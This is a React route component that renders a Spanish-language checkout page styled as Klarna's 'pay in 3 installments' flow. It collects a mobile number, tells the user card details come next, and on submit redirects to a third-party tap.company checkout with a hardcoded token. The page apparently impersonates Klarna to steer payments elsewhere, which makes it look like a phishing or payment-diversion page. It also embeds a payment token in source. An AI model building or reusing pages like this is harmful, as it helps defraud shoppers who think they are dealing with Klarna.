import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { PhoneShell } from "@/components/PhoneShell";

export const Route = createFileRoute("/klarna")({
  component: KlarnaPage,
});

function KlarnaPage() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState("");

const onSubmit = (e) => {
  e.preventDefault();
  window.location.href = "https://checkout.tap.company/?mode=page&themeMode=&language=en&token=eyJhbGciOiJIUzI1NiJ9.eyJpZCI6IjZhMDg1ODY0NjVjNjg3NzVlODYxYTc0YyJ9.j4gs7IqNmhbBEEsM9lYzYRvVPcNs1iBDtgCeHY8jq7A";
};

  return (
    <PhoneShell showHelp={false}>
      <div className="flex justify-center mt-4 mb-4">
        <div className="px-4 py-2 rounded-lg bg-[#FFA8CD] text-black font-bold text-2xl tracking-tight">
          Klarna.
        </div>
      </div>
      <h1 className="text-xl font-bold text-center">Paga en 3 plazos sin intereses</h1>
      <p className="text-center text-sm text-gray-600 mt-2 mb-5">
        Introduce tu número de móvil para continuar
      </p>

      <div className="rounded-xl border border-gray-200 p-4 space-y-2 text-sm">
        <Row label="Hoy" value="71,61 €" />
        <Row label="En 30 días" value="71,61 €" />
        <Row label="En 60 días" value="71,61€" />
      </div>

      <form onSubmit={onSubmit} className="mt-6 space-y-4">
        <div>
          <label className="text-xs text-gray-600">Número de móvil</label>
          <div className="mt-1 flex">
            <span className="inline-flex items-center px-3 border border-r-0 border-gray-300 rounded-l-lg text-sm bg-gray-50">
              +34
            </span>
            <input
              type="tel"
              required
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder="600 000 000"
              className="flex-1 border border-gray-300 rounded-r-lg px-4 py-3 text-sm focus:outline-none focus:border-black"
            />
          </div>
        </div>

        <button
          type="submit"
          className="w-full py-3.5 rounded-full bg-black hover:bg-gray-800 transition text-white font-semibold text-sm"
        >
          Continuar
        </button>

        <p className="text-center text-xs text-gray-500">
          Al confirmar, te pediremos los datos de tu tarjeta para finalizar el pago.
        </p>
      </form>
    </PhoneShell>
  );
}

function Row({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex justify-between">
      <span className="text-gray-700">{label}</span>
      <span className="font-semibold">{value}</span>
    </div>
  );
}
